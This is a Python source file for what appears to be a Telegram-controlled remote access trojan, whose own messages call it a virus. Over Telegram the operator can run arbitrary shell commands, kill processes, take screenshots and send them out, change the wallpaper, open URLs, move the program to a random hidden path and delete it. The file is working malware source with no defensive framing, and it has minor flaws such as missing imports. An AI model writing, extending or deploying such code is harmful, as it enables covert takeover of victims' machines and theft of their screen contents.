from .bot import *
from .dispatcher import *

from modules import *

import pyautogui

import aiogram
import aiogram.types

import platform
import webbrowser
import psutil
import os
import re

import traceback

async def send_status(message: aiogram.types.Message, l: list, i: int):
    await message.reply("Бот 'Разгром' запущен, информация о носителе:\n" + platform.platform() + '\n' + ("Автозапуск настроен" if is_in_autorun() else "Автозапуск отключён!"))

async def pkill(message: aiogram.types.Message, l: list, i: int):
    try:
        name = l[i+1]

        for proc in psutil.process_iter():
            if proc.name() == name:
                proc.kill()
    except Exception as e:
        await message.reply("Ошибка!")

async def spawn(message: aiogram.types.message, l: list, i: int):
    try:
        os.popen(l[i+1])
    except Exception as e:
        await message.reply("Ошибка!")

async def url_open(message: aiogram.types.message, l: list, i: int):
    try:
        webbrowser.open(l[i+1])
    except Exception as e:
        await message.reply("Ошибка!")
        return

    await message.reply("Успешно открыт введённый URL.")

async def imgpopup(message: aiogram.types.message, l: list, i: int):
    try:
        show_image_window(l[i+1])
    except Exception as e:
        await message.reply("Ошибка!")

async def wallpaper(message: aiogram.types.message, l: list, i: int):
    try:
        imsave(l[i+1])
        set_wallpaper(os.path.abspath(os.path.join(".", "wallpaper.png")))
    except Exception as e:
        await message.reply("Ошибка!")

async def screenshot(message: aiogram.types.message, l: list, i: int):
    try:
        img = pyautogui.screenshot()

        b = io.BytesIO()
        img.save(b, "PNG")
        b.name = "screenshot.png"

        b.seek(0)

        f = aiogram.types.BufferedInputFile(b.getvalue(), "screenshot.png")

        await bot.send_photo(message.chat.id, f)
    except Exception as e:
        await message.reply("Ошибка!")

async def randomhide(message: aiogram.types.message, l: list, i: int):
    try:
        await message.reply("Вирус перепрятан, новый путь: " + self_hide())
    except Exception as e:
        traceback.print_exc()
        await message.reply("Ошибка!")

async def selfdestruct(message: aiogram.types.message, l: list, i: int):
    try:
        os.remove(sys.executable)
        print("Успешное самоуничтожение!")
        exit(0)
    except Exception as e:
        print("Ошибка!")

HANDLERS = {
    "status": send_status,
    "open": url_open,
    "pkill": pkill,
    "spawn": spawn,
    "imgpopup": imgpopup,
    "wallpaper": wallpaper,
    "screenshot": screenshot,
    "randomhide": randomhide,
    "selfdestruct": selfdestruct
}

@dp.message()
async def send_status(message: aiogram.types.Message):
    try:
        t = re.sub("[\n]", " ", message.text)

        l = t.split(" ")

        for i, h in enumerate(list(HANDLERS.keys())):
            for j in range(len(l)):
                if l[j] == h:
                    await HANDLERS[h](message, l, j)

        return True
    except Exception as e:
        return False